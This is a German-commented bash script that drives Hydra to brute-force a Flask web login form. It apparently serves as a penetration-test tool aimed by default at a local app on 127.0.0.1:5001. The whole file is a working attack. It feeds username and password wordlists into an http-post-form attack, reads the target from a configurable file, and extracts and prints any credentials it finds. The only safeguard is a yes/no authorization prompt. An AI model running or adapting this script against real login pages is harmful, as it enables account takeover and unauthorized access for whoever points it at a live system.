#!/bin/bash

################################################################################
# Hydra Brute-Force Attack Script
# Ziel: Flask Login-Formular (Hebeln Mit Kopf)
# Autor: Automatisch generiert für Penetrationstest-Zwecke
# WARNUNG: NUR für autorisierte Tests verwenden!
################################################################################

set -e  # Exit on error

# Farben für Output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Verzeichnis-Pfade
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_FILE="${SCRIPT_DIR}/config.json"
USERNAMES_FILE="${SCRIPT_DIR}/wordlists/usernames.txt"
PASSWORDS_FILE="${SCRIPT_DIR}/wordlists/passwords.txt"
OUTPUT_FILE="${SCRIPT_DIR}/results/hydra_output.txt"
DETAILED_LOG="${SCRIPT_DIR}/results/hydra_detailed.log"

################################################################################
# Funktionen
################################################################################

print_banner() {
    echo -e "${BLUE}"
    echo "================================================================================"
    echo "  HYDRA BRUTE-FORCE ATTACK TOOL"
    echo "  Target: Flask Login (Hebeln Mit Kopf)"
    echo "================================================================================"
    echo -e "${NC}"
}

print_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

check_dependencies() {
    print_info "Prüfe Abhängigkeiten..."

    # Prüfe ob Hydra installiert ist
    if ! command -v hydra &> /dev/null; then
        print_error "Hydra ist nicht installiert!"
        echo ""
        echo "Installation:"
        echo "  macOS:   brew install hydra"
        echo "  Linux:   sudo apt-get install hydra"
        echo "  Arch:    sudo pacman -S hydra"
        echo ""
        exit 1
    fi

    # Prüfe ob jq installiert ist (für JSON-Parsing)
    if ! command -v jq &> /dev/null; then
        print_warning "jq ist nicht installiert (optional für Config-Parsing)"
        print_info "Verwende Standard-Konfiguration"
    fi

    print_success "Alle notwendigen Tools sind installiert"
}

check_files() {
    print_info "Prüfe Wordlist-Dateien..."

    if [ ! -f "$USERNAMES_FILE" ]; then
        print_error "Username-Wordlist nicht gefunden: $USERNAMES_FILE"
        exit 1
    fi

    if [ ! -f "$PASSWORDS_FILE" ]; then
        print_error "Password-Wordlist nicht gefunden: $PASSWORDS_FILE"
        exit 1
    fi

    # Zähle Einträge (ignoriere Kommentare und leere Zeilen)
    USERNAME_COUNT=$(grep -v '^#' "$USERNAMES_FILE" | grep -v '^$' | wc -l | tr -d ' ')
    PASSWORD_COUNT=$(grep -v '^#' "$PASSWORDS_FILE" | grep -v '^$' | wc -l | tr -d ' ')
    TOTAL_COMBINATIONS=$((USERNAME_COUNT * PASSWORD_COUNT))

    print_success "Wordlist-Dateien gefunden"
    print_info "Usernames: $USERNAME_COUNT"
    print_info "Passwords: $PASSWORD_COUNT"
    print_info "Gesamt-Kombinationen: $TOTAL_COMBINATIONS"
}

load_config() {
    print_info "Lade Konfiguration..."

    if [ ! -f "$CONFIG_FILE" ]; then
        print_warning "Config-Datei nicht gefunden, verwende Standard-Werte"
        TARGET_HOST="127.0.0.1"
        TARGET_PORT="5001"
        TARGET_PATH="/login"
        THREADS="4"
        TIMEOUT="30"
        FAILURE_STRING="Ungültige Anmeldedaten"
        return
    fi

    if command -v jq &> /dev/null; then
        TARGET_HOST=$(jq -r '.target.host' "$CONFIG_FILE")
        TARGET_PORT=$(jq -r '.target.port' "$CONFIG_FILE")
        TARGET_PATH=$(jq -r '.target.path' "$CONFIG_FILE")
        THREADS=$(jq -r '.attack_settings.threads' "$CONFIG_FILE")
        TIMEOUT=$(jq -r '.attack_settings.timeout' "$CONFIG_FILE")
        FAILURE_STRING=$(jq -r '.form_parameters.failure_string' "$CONFIG_FILE")
        print_success "Konfiguration geladen"
    else
        # Fallback ohne jq
        TARGET_HOST="127.0.0.1"
        TARGET_PORT="5001"
        TARGET_PATH="/login"
        THREADS="4"
        TIMEOUT="30"
        FAILURE_STRING="Ungültige Anmeldedaten"
    fi

    print_info "Target: http://${TARGET_HOST}:${TARGET_PORT}${TARGET_PATH}"
    print_info "Threads: ${THREADS}"
    print_info "Timeout: ${TIMEOUT}s"
}

legal_notice() {
    echo ""
    echo -e "${RED}================================================================================"
    echo "  RECHTLICHER HINWEIS"
    echo "================================================================================"
    echo "  Dieses Tool ist NUR für autorisierte Penetrationstests gedacht!"
    echo "  Unbefugtes Testen fremder Systeme ist illegal!"
    echo -e "================================================================================${NC}"
    echo ""

    read -p "Bestätigen Sie, dass Sie berechtigt sind? (ja/nein): " response
    if [[ ! "$response" =~ ^(ja|yes|y|j)$ ]]; then
        print_error "Abgebrochen."
        exit 0
    fi
}

run_hydra_attack() {
    print_info "Starte Hydra Brute-Force Attack..."
    echo ""

    # Erstelle Results-Verzeichnis falls nicht vorhanden
    mkdir -p "${SCRIPT_DIR}/results"

    # Hydra-Befehl
    # Format: http-post-form "PATH:FORM-PARAMETERS:FAILURE-STRING"
    # ^USER^ wird durch Username ersetzt
    # ^PASS^ wird durch Passwort ersetzt

    # ============================================================================
    # FIX #2: Wordlists bereinigen (Kommentare und Leerezeilen entfernen)
    # PROBLEM: Hydra versuchte Zeilen wie "# Username Wordlist..." als Login
    # LÖSUNG: Mit grep Kommentare (^#) und Leerzeilen (^$) herausfiltern
    # ============================================================================
    CLEAN_USERNAMES="${SCRIPT_DIR}/results/.usernames_clean.txt"
    CLEAN_PASSWORDS="${SCRIPT_DIR}/results/.passwords_clean.txt"

    print_info "Bereite Wordlists vor..."
    grep -v '^#' "${USERNAMES_FILE}" | grep -v '^$' > "${CLEAN_USERNAMES}"
    grep -v '^#' "${PASSWORDS_FILE}" | grep -v '^$' > "${CLEAN_PASSWORDS}"

    # Zähle bereinigte Einträge
    CLEAN_USER_COUNT=$(wc -l < "${CLEAN_USERNAMES}" | tr -d ' ')
    CLEAN_PASS_COUNT=$(wc -l < "${CLEAN_PASSWORDS}" | tr -d ' ')

    print_info "Target: http://${TARGET_HOST}:${TARGET_PORT}${TARGET_PATH}"
    print_info "Bereinigte Usernames: ${CLEAN_USER_COUNT}"
    print_info "Bereinigte Passwords: ${CLEAN_PASS_COUNT}"
    print_info "Gesamt-Versuche: $((CLEAN_USER_COUNT * CLEAN_PASS_COUNT))"
    echo ""
    echo "================================================================================"

    # ============================================================================
    # FIX #1: Korrekte Optionen-Reihenfolge
    # PROBLEM: Hydra zeigte nur Hilfe, weil Optionen nach Host/Service standen
    # ALTE (FEHLERHAFTE) SYNTAX:
    #   hydra -L users -P pass HOST -s PORT http-post-form "..." -t 4 -w 30 -o out
    # NEUE (KORREKTE) SYNTAX:
    #   hydra -L users -P pass -t 4 -w 30 -o out -s PORT HOST http-post-form "..."
    # REGEL: ALLE Optionen MÜSSEN vor Host und Service stehen!
    # ============================================================================

    # Führe Hydra aus und speichere Output
    hydra -L "${CLEAN_USERNAMES}" -P "${CLEAN_PASSWORDS}" \
        -t "${THREADS}" -w "${TIMEOUT}" \
        -o "${OUTPUT_FILE}" \
        -s "${TARGET_PORT}" \
        -V \
        "${TARGET_HOST}" \
        http-post-form "${TARGET_PATH}:username=^USER^&password=^PASS^:${FAILURE_STRING}" \
        2>&1 | tee "$DETAILED_LOG"

    HYDRA_EXIT_CODE=${PIPESTATUS[0]}

    echo "================================================================================"
    echo ""

    if [ $HYDRA_EXIT_CODE -eq 0 ]; then
        print_success "Hydra-Angriff abgeschlossen"
    else
        print_warning "Hydra Exit Code: $HYDRA_EXIT_CODE"
    fi
}

analyze_results() {
    print_info "Analysiere Ergebnisse..."

    if [ ! -f "$OUTPUT_FILE" ]; then
        print_warning "Keine Output-Datei gefunden"
        return
    fi

    # Zähle erfolgreiche Logins
    SUCCESS_COUNT=$(grep -c "login:" "$OUTPUT_FILE" 2>/dev/null || echo "0")

    if [ "$SUCCESS_COUNT" -gt 0 ]; then
        print_success "Erfolgreiche Logins gefunden: $SUCCESS_COUNT"
        echo ""
        echo "GEFUNDENE CREDENTIALS:"
        echo "--------------------------------------------------------------------------------"
        grep "login:" "$OUTPUT_FILE" | while read -r line; do
            echo "  $line"
        done
        echo "--------------------------------------------------------------------------------"
        echo ""
        print_info "Vollständige Ergebnisse: $OUTPUT_FILE"
    else
        print_warning "Keine erfolgreichen Logins gefunden"
    fi

    # Rufe Python-Analyzer auf falls vorhanden
    ANALYZER_SCRIPT="${SCRIPT_DIR}/analyze_results.py"
    if [ -f "$ANALYZER_SCRIPT" ]; then
        print_info "Führe Python-Analyzer aus..."
        python3 "$ANALYZER_SCRIPT"
    fi
}

print_summary() {
    echo ""
    echo "================================================================================"
    echo "  ZUSAMMENFASSUNG"
    echo "================================================================================"
    print_info "Output-Datei: $OUTPUT_FILE"
    print_info "Detailliertes Log: $DETAILED_LOG"
    print_info "JSON-Ergebnisse: ${SCRIPT_DIR}/results/successful_logins.json (falls vorhanden)"
    echo "================================================================================"
    echo ""
}

################################################################################
# Hauptprogramm
################################################################################

main() {
    print_banner
    legal_notice
    check_dependencies
    check_files
    load_config

    echo ""
    print_info "Bereit zum Start. Drücke ENTER zum Fortfahren oder CTRL+C zum Abbrechen..."
    read

    run_hydra_attack
    analyze_results
    print_summary

    print_success "Fertig!"
}

# Führe Hauptprogramm aus
main "$@"
